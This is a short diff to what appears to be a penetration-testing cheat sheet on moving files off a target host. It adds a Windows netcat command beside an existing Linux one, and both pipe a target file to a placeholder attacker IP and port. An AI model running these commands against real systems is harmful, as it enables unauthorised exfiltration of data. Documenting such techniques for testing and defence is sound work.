@@ -81,6 +81,12 @@ Target host uploads files
 cat /usr/bin/which | nc <attacker ip> <attacker port>
 ```
 
+Windows
+
+```cmd
+nc.exe <attacker ip> <attacker port> < <target file>
+```
+
 Checking if the file is correct
 
 attacker
